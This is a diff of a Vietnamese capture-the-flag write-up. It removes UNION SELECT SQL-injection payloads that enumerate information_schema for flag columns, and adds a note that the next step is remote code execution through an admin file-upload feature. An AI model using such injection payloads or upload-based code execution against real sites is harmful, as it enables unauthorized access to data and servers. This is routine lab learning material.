@@ -48,26 +48,10 @@
 
 = Lấy username, password trong bảng `users` của admin và Đăng nhập vào tài khoản của admin.
 
-= Để ý trước lỗi ghi là LIKE '%flag%' nên mình đã viết là:
-`
-UNION SELECT 1,2,3,4,5,column_name,7,8,9,10,11,12,13,14,15 
-FROM information_schema.columns
-WHERE column_name LIKE '%flag%' -- -
-`
+= Theo như hỏi hint của anh bạn đã làm rồi thì sau khi mình đăng nhập được vào admin thì mình pải RCE chức năng `Upload file` mới được huhu.
+<img width="487" height="142" alt="image" src="https://github.com/user-attachments/assets/196f0ab5-8d86-4a1e-8909-a5c9e877c2ff" />
 
-= Hiện có 3 cột là `FLAGS` và `WAITERS_FLAG` và `FLAG`. Dùng payload tìm tên bảng và tên cột:
-
-```
-UNION SELECT 1,2,3,4,5,CONCAT(table_name, ':', column_name),7,8,9,10,11,12,13,14,15 
-FROM information_schema.columns
-WHERE column_name LIKE '%flag%' -- -
-```
-<img width="470" height="152" alt="image" src="https://github.com/user-attachments/assets/0fdb105d-e6bd-4be5-b76a-63a29bd3a0f5" />
-
-= Vậy là cột FLAG nằm trong bảng `INNODB_SYS_TABLESPACES`:
-
-<img width="1751" height="940" alt="image" src="https://github.com/user-attachments/assets/fa135f5b-f8d5-46ad-8d2f-1d606bc213b5" />
-
+= Script đây, giờ up lên thôi
 
 
 
